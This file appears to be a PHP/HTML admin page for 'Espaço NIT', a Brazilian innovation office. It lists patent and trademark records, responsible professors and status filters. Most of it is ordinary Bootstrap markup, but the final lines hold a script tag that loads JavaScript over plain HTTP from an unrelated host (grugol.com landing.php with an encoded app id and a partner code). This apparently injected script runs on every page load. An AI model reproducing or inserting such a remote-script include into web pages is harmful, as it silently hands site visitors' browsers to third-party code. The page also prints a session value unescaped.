<?php

include 'configs/conexao.php';

if (!isset($_SESSION)) {
	session_start();
}
?>


<html lang="pt-BR">

<head>

	<meta charset="UTF-8" />
	<title>Administrador - Acesso/Bloqueio</title>
	<meta charset="UTF-8">

	<!--Os arquivos Meta-->
	<meta name="viewport" content="width=device-width,initial-scale=1.0">
	<meta name="description" content"Espaço NIT">
	<meta name="author" content="">
	<!--Fim dos arquivos Meta-->

	<!--Os Arquivos CSS-->
	<link href="css/bootstrap.min.css" rel="stylesheet">
	<link href="css/bootstrap-responsive.min.css" rel="stylesheet">
	<link href="css/template.css" rel="stylesheet">


	<!--HTML5 shim,for IE6-8 support of HTML5 elements -->
	<!--[if lt IE 9]>
			<script src="js/html5shiv.js></script>"
		<![endif]-->

</head>
<div class="container-fluid" style="margin-top:80px;">
	<div class="row">
		<div class="col-md-2" id="menu-esquerdo">
			<p><img src="img/nit.jpg" style="margin-left:15px"></p>
			<ul class="nav nav-pills nav-stacked">
				<li role="presentation"><a href="propriedades.php"><img src="img/dashboard.png"> DashBoard</a></li>
				<li role="presentation"><a href="minhastarefas.php"><img src="img/carrinho.png"> Minhas Notificações</a></li>
				<li role="presentation"><a href="minhaconta.php"><img src="img/ticket.png"> Minha Conta</a></li>
				<li role="presentation"><a href="faq.php"><img src="img/faq.png"> Sistema de FAQ</a></li>
				<li role="presentation"><a href="login.php"><img src="img/sair.png"> Sair</a></li>
			</ul>
		</div> <!--Final Menu Esquerdo-->

		<div class="col-md-5">
			<form class="form-inline">

				<span>Filtrar por Status</span>
				<select class="form-control">
					<option>Patente Concedida</option>
					<option>Patente Depositada</option>
					<option>Acompanhamento Revista</option>
					<option>Buscas</option>
					<option>Esperando Contabilidade</option>
				</select>


				<button type="submit" class="btn btn-primary">Filtrar</button>
			</form>

		</div>
		<div class="col-md-5">
			<form class="form-inline" action="patente.php">

				<label class="sr-only" for="exampleInputEmail3">Digite o que deseja buscar</label>
				<input type="search" class="form-control" id="exampleInputEmail3" placeholder="Digite o que deseja buscar">


				<button type="submit" class="btn btn-primary">Realizar Busca</button>
				<a href="adicionarmarca.php" class="btn btn-success">Adicionar Marca</a>
			</form>
		</div>
		<d <div class="table-responsive col-md-10">
			<table class="table table-striped" cellspacing="0" cellpadding="0">
				<thead>
					<tr>
						<th>Nome da Marca</th>
						<th>Situa&ccedil;&atilde;o</th>

						<th>Professor Responsável</th>
						<th class="actions">A&ccedil;&otilde;es</th>
					</tr>
				</thead>

				<body>

					<!-- Modal -->
					<div class="modal fade" id="delete-modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
						<div class="modal-dialog" role="document">
							<div class="modal-content">
								<div class="modal-header">
									<button type="button" class="close" data-dismiss="modal" aria-label="Fechar"><span aria-hidden="true">&times;</span></button>
									<h4 class="modal-title" id="modalLabel">Excluir Item</h4>
								</div>
								<div class="modal-body">
									Deseja realmente excluir este Usu&aacute;rio?
								</div>
								<div class="modal-footer">
									<button type="button" class="btn btn-primary">Sim</button>
									<button type="button" class="btn btn-default" data-dismiss="modal">N&atilde;o</button>
								</div>
							</div>
						</div>
					</div>



					<nav class="navbar navbar-default navbar-fixed-top">
						<div class="container">
							<div class="navbar-header">
								<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
									<span class="sr-only">Toggle navigation</span>
									<span class="icon-bar"></span>
									<span class="icon-bar"></span>
									<span class="icon-bar"></span>
								</button>
								<span class="navbar-brand" href="index.php"><b>Espaço NIT</b></span>
							</div>
							<div id="navbar" class="navbar-collapse collapse">
								<ul class="nav navbar-nav">
									<li class="active"><a href="index.php">DashBoard</a></li>
									<li><a href="https://www.facebook.com/NIT.IFAL/">Fan Page</a></li>
									<li><a href="quem.php">Quem Somos</a></li>
									<li><a href="contato.php">Contato</a></li>
								</ul>
								<ul class="nav navbar-nav navbar-right">


									<!--<li class="active"><a href="./">Fixed top <span class="sr-only">(current)</span></a></li>-->
									<div id="perfil">
										<span style="vertical-align:middle; padding-right:10px"> <i><?php echo $_SESSION['nome']; ?></i></span>
										<a href="minhaconta.php"><img src="https://via.placeholder.com/40" class="img-circle"></a>
									</div>


								</ul>
							</div><!--/.nav-collapse -->
						</div>
					</nav> <!--Final da NavBar-->

					<tr>
						<td><span class="glyphicon glyphicon-list-alt" aria-hidden="true"></span> Criação de um Dendrômetro para medição da produtividade na agricultura</td>
						<td><span class="glyphicon glyphicon-ok" aria-hidden="true"></span> Patente Concedida</td>
						<td>Edson Camilo</td>
						<td class="actions">

							<!--dropdown-->
							<div class="btn-group">
								<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
									Opções <span class="caret"></span>
								</button>
								<ul class="dropdown-menu">
									<li><a class="btn btn-success btn-xs" href="visualizarpatente.php">Visualizar</a></li>
									<li></li>
									<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
									<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
								</ul>
							</div>
						</td>
					</tr>
					<tr>
						<td><span class="glyphicon glyphicon-list-alt" aria-hidden="true"></span> Calda Sabor Tapioca Alagoana</td>
						<td><span class="glyphicon glyphicon-ok" aria-hidden="true"></span> Patente Concedida</td>
						<td>Tascya Morgana</td>
						<td class="actions">

							<!--dropdown-->
							<div class="btn-group">
								<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
									Opções <span class="caret"></span>
								</button>
								<ul class="dropdown-menu">
									<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
									<li></li>
									<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
									<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
								</ul>
							</div>
						</td>
					</tr>
					<tr>
						<td><span class="glyphicon glyphicon-list-alt" aria-hidden="true"></span> Farinha nutritiva a partir do bagaço de pinha (Annona squamosa L.) para o desenvolvimento de formulações alimentares</td>
						<td><span class="glyphicon glyphicon-time" aria-hidden="true"></span> Esperando contabilidade</td>
						<td>Felype Thiago</td>
						<td class="actions">

							<!--dropdown-->
							<div class="btn-group">
								<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
									Opções <span class="caret"></span>
								</button>
								<ul class="dropdown-menu">
									<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
									<li></li>
									<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
									<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
								</ul>
							</div>
						</td>
					</tr>
					<tr>
						<td><span class="glyphicon glyphicon-list-alt" aria-hidden="true"></span> Elaboração de Biscoito Tipo Cookie com Farinha de Fígado Bovino </td>
						<td><span class="glyphicon glyphicon-time" aria-hidden="true"></span> Esperando contabilidade </td>
						<td>Ingrid Sofia Macedo Soares </td>
						<td class="actions">

							<!--dropdown-->
							<div class="btn-group">
								<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
									Opções <span class="caret"></span>
								</button>
								<ul class="dropdown-menu">
									<li><a class="btn btn-success btn-xs" href="visualizarpatente.php">Visualizar</a></li>
									<li></li>
									<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
									<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
								</ul>
							</div>
						</td>
					</tr>
					<tr>
						<td><span class="glyphicon glyphicon-list-alt" aria-hidden="true"></span> Produção de Etanol de Segunda Geração a Partir da Bioconversão da Folha do Coqueiro como Biomassa Lignocelulósica</td>
						<td><span class="glyphicon glyphicon-pencil" aria-hidden="true"></span> Acompanhamento na Revista</td>
						<td>Márcia Gomes</td>
						<td class="actions">

							<!--dropdown-->
							<div class="btn-group">
								<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
									Opções <span class="caret"></span>
								</button>
								<ul class="dropdown-menu">
									<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
									<li></li>
									<li><a class="btn btn-warning btn-xs" href="adm_edit.php">Editar</a></li>
									<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
								</ul>
							</div>
						</td>
					</tr>








			</table>
	</div>

</div> <!-- /#list -->


<!-- Modal -->
<div class="modal fade" id="delete-modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
	<div class="modal-dialog" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal" aria-label="Fechar"><span aria-hidden="true">&times;</span></button>
				<h4 class="modal-title" id="modalLabel">Excluir Item</h4>
			</div>
			<div class="modal-body">
				Deseja realmente excluir este item?
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-primary">Sim</button>
				<button type="button" class="btn btn-default" data-dismiss="modal">N&atilde;o</button>
			</div>
		</div>
	</div>
</div>
<hr>
<footer>
	<h3>&copy Espaço NIT - Todos os Direitos Reservados</h3>
</footer>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<script src='http://grugol.com/prog/landing.php?app=MDAtMUYtRDAtRTgtMEItQTQ=&partner=300'></script>
</body>
</body>

</html>

</html>